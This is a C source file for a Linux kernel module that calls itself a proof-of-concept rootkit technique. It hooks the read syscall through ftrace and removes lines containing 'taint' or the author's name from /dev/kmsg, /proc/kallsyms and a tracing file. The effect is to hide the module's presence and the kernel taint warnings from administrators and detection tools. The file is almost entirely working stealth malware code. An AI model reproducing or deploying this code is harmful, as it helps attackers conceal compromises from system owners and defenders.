#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include "ftrace.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuzsec/fs3cs0ciety");
MODULE_DESCRIPTION("POC/Demo hiding 'taint' messages from /dev/ksmg and the modules functions from /proc/kallsyms");

#define B_F 4096  // Temporary buffer size for reading

static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs); // Pointer to the original read function

// Hooked function that intercepts the syscall read
static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
    int fd = regs->di; // First argument of read: fd
    char __user *user_buf = (char __user *)regs->si; // Second argument: output buffer for user
    size_t count = regs->dx; // Number of bytes to read
    char *kernel_buf;
    ssize_t bytes_read;
    struct file *file;

    // Check if the fd is from /dev/kmsg or /proc/kallsyms
    file = fget(fd); // Gets the file object corresponding to the fd
    if (file) {
        // Check if the file is /dev/kmsg or /proc/kallsyms or /sys/kernel/tracing/touched_functions
        if (strcmp(file->f_path.dentry->d_name.name, "kmsg") == 0 ||
            strcmp(file->f_path.dentry->d_name.name, "kallsyms") == 0 ||
            strcmp(file->f_path.dentry->d_name.name, "touched_functions") == 0) {
            fput(file); // Frees the file object after verification

            // Allocates a temporary buffer in kernel space
            kernel_buf = kmalloc(B_F, GFP_KERNEL);
            if (!kernel_buf) {
                printk(KERN_ERR "Failed to allocate temporary buffer.\n");
                return -ENOMEM;
            }

            // Calls the original function to read data from the file
            bytes_read = orig_read(regs);
            if (bytes_read < 0) {
                kfree(kernel_buf);
                return bytes_read;
            }

            // Copies data read from user space to the buffer in the kernel for processing
            if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
                kfree(kernel_buf);
                return -EFAULT;
            }

            // Filter out lines that contain the words "taint" or "lkm"
            char *filtered_buf = kzalloc(B_F, GFP_KERNEL); // Buffer for filtered messages
            if (!filtered_buf) {
                kfree(kernel_buf);
                return -ENOMEM;
            }

            char *line, *line_ptr;
            size_t filtered_len = 0;

            // Process the kernel buffer, line by line
            line = kernel_buf;
            while ((line_ptr = strchr(line, '\n'))) {
                *line_ptr = '\0';  // Temporarily terminate the line

                // Check if the line contains "taint" or "lkm"
                if (!strstr(line, "taint") && !strstr(line, "matheuz")) {
                    size_t line_len = strlen(line);
                    if (filtered_len + line_len + 1 < B_F) {  // Check for space in the filtered buffer
                        strcpy(filtered_buf + filtered_len, line);  // Append the line
                        filtered_len += line_len;
                        filtered_buf[filtered_len++] = '\n';  // Add newline after the line
                    }
                }

                line = line_ptr + 1;  // Move to the next line
            }

            // Ensures the final buffer is null-terminated
            filtered_buf[filtered_len] = '\0';

            // Copy the filtered buffer back to userspace
            if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
                kfree(kernel_buf);
                kfree(filtered_buf);
                return -EFAULT;
            }

            kfree(kernel_buf);
            kfree(filtered_buf);
            return filtered_len;
        }

        fput(file); // Frees the file object if it's neither /dev/kmsg nor /proc/kallsyms
    }

    return orig_read(regs); // Calls the original reading function if it's not /dev/kmsg or /proc/kallsyms
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_read", hook_read, &orig_read),
};

static int __init poop_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        printk(KERN_ERR "Oh nooo, error ://\n");
        return err;
    }
    printk(KERN_INFO "Join: https://discord.gg/66N5ZQppU7.\n");
    return 0;
}

static void __exit poop_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "Join: https://discord.gg/66N5ZQppU7\n");
}

module_init(poop_init);
module_exit(poop_exit);

